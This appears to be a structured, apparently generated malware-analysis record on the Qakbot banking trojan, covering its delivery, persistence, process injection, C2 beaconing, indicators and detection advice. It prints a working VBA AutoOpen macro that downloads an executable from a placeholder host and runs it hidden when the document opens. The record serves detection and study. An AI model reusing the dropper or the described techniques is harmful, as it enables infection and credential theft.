package_info.package_manager: malware distribution via spam email (not a software package manager)
package_info.package_versions: Active since at least 2008; multiple evolving versions
package_info.why_malicious: Qakbot is a modular banking trojan and malware platform distributed via spam emails with malicious attachments and links. It is used for credential theft, lateral movement, and as a delivery platform for ransomware, impacting hundreds of thousands of systems globally. Its techniques include process injection, credential theft, persistence mechanisms, and command-and-control communication, making it a high-impact, multi-stage threat.

execution_context.trigger: At document open (import-time), when the user opens the malicious attachment or link
execution_context.file_location: malicious email attachment (macro-enabled document or executable payload)

malicious_snippets.code_snippet:
Sub AutoOpen()
  Dim objXML As Object
  Set objXML = CreateObject("MSXML2.XMLHTTP")
  objXML.Open "GET", "http://malicious-domain.com/payload.exe", False
  objXML.send
  If objXML.Status = 200 Then
    Dim objStream As Object
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Type = 1
    objStream.Open
    objStream.Write objXML.responseBody
    objStream.SaveToFile Environ("TEMP") & "\payload.exe", 2
    objStream.Close
    Shell Environ("TEMP") & "\payload.exe", vbHide
  End If
End Sub
malicious_snippets.code_behavior: At import-time, the macro downloads an executable from a remote server using XMLHTTP, writes it to the TEMP directory via ADODB.Stream, and executes it with Shell, resulting in initial malware infection.

malice_analysis.why_suspicious: Macros that download and execute remote binaries are a well-known malware delivery technique, especially when triggered automatically on document open.
malice_analysis.violated_expectations: Normal macros are intended for document automation, such as formatting or calculations, and should not perform network operations or execute files.
malice_analysis.similar_legitimate_use: Automated document processing in highly controlled, trusted internal environments, but such behavior is extremely rare and should be tightly restricted.
key_indicators: Use of CreateObject to instantiate MSXML2.XMLHTTP and ADODB.Stream
HTTP GET request to an external, untrusted domain
Writing an executable to the TEMP directory
Executing the downloaded file via Shell with vbHide

execution_context.trigger: At runtime, after initial payload execution
execution_context.file_location: dropped Qakbot executable (payload.exe or similar) on disk

malicious_snippets.code_behavior: At runtime, the malware opens a handle to a target process, allocates memory, writes a payload, and creates a remote thread for process injection; it then reads credential data from the registry and exfiltrates it to a command-and-control server.

malice_analysis.why_suspicious: Process injection and credential theft are advanced techniques used by malware to evade detection, maintain persistence, and steal sensitive information.
malice_analysis.violated_expectations: Legitimate software does not inject code into unrelated processes or access sensitive registry keys for credential data, nor does it exfiltrate such data to external servers.
malice_analysis.similar_legitimate_use: Debugging or security tools may use process injection for diagnostics, but only with explicit user consent and in trusted environments.
key_indicators: Use of Windows API calls: OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread
Network exfiltration of credential data to external C2 infrastructure

execution_context.trigger: At runtime, during persistence establishment after initial infection
execution_context.file_location: Windows registry (autorun key), scheduled tasks, or startup folder

malicious_snippets.code_behavior: At runtime, the malware creates a registry autorun entry or scheduled task referencing its executable in the user's AppData directory, ensuring it runs automatically on system startup and maintains persistence.

malice_analysis.why_suspicious: Malware frequently uses autorun registry keys and scheduled tasks to maintain persistence across reboots, especially when referencing executables in user profile directories.
malice_analysis.violated_expectations: Legitimate installers may register startup tasks, but not from untrusted sources, and typically prompt the user for consent.
malice_analysis.similar_legitimate_use: Some legitimate software (e.g., updaters or system utilities) may use autorun keys or scheduled tasks, but these should be signed and from trusted vendors.
key_indicators: Modification of registry autorun keys referencing unknown executables
Creation of scheduled tasks with suspicious names or paths in user directories
Executable path in %APPDATA% or %TEMP% referencing qakbot.exe or similar

execution_context.trigger: At runtime, during post-infection command-and-control communication
execution_context.file_location: Qakbot process memory or network communication module

malicious_snippets.code_behavior: At runtime, the malware collects system information, sends it to a command-and-control server via HTTP, receives remote commands (such as to download and execute ransomware), and executes them in a loop, enabling ongoing attacker control.

malice_analysis.why_suspicious: Unsolicited outbound connections to C2 infrastructure, periodic beaconing, and remote command execution are core behaviors of advanced malware like Qakbot.
malice_analysis.violated_expectations: Normal software does not communicate with unknown servers or execute arbitrary remote commands without user knowledge or consent.
malice_analysis.similar_legitimate_use: Remote management tools may perform similar actions, but only with user consent and to known, trusted infrastructure.
key_indicators: Periodic outbound HTTP/HTTPS connections to untrusted or known malicious domains
Ability to receive and execute remote commands, including downloading additional payloads
Beaconing behavior with regular intervals (e.g., Sleep(60000))

attack_chain.action: User receives a spam email with a malicious attachment or link.
attack_chain.leads_to: User opens the attachment, triggering macro execution.

attack_chain.action: Malicious macro downloads and executes the Qakbot payload.
attack_chain.leads_to: Initial infection and execution of Qakbot binary.

attack_chain.action: Qakbot establishes persistence on the infected system.
Qakbot injects into other processes, steals credentials, and exfiltrates data.
Qakbot communicates with C2 servers, receives further instructions (e.g., ransomware deployment).
attack_chain.leads_to: Potential ransomware deployment or further malicious activity.

behavioral_signatures: Office documents with macros that perform network downloads and execute binaries upon opening
Process injection into legitimate Windows processes using OpenProcess, VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread
Creation or modification of registry autorun keys or scheduled tasks referencing executables in %APPDATA% or %TEMP%
Unusual outbound HTTP/HTTPS connections to known Qakbot C2 domains or dynamic infrastructure
Access to sensitive registry keys (e.g., HKLM\SECURITY\Policy\Secrets) and exfiltration of credential data
file_indicators: Office documents (e.g., .doc, .xls) with embedded macros that initiate network activity
Executables dropped in %TEMP% or %APPDATA% directories (e.g., qakbot.exe, payload.exe)
Registry autorun keys under HKCU\Software\Microsoft\Windows\CurrentVersion\Run referencing unknown executables
Scheduled tasks with suspicious names (e.g., 'Qakbot') or paths pointing to user profile directories
network_indicators: Connections to known Qakbot C2 domains/IPs (e.g., hxxp://malicious-c2.com/api)
Beaconing to dynamic or fast-flux infrastructure with regular intervals
Unusual HTTP/HTTPS POST requests containing system or credential data to external servers
detection_knowledge.how_to_detect: Monitor for Office documents with macros that initiate network downloads and execute files upon opening. Detect process injection techniques by monitoring for suspicious use of Windows API calls (OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread). Alert on creation or modification of autorun registry keys or scheduled tasks by unknown executables, especially those in %APPDATA% or %TEMP%. Monitor outbound network traffic for connections to known Qakbot C2 infrastructure, beaconing patterns, and exfiltration of credential or system data. Use endpoint protection and sandboxing to emulate and block Qakbot behaviors, and correlate file, registry, and network indicators for comprehensive detection.
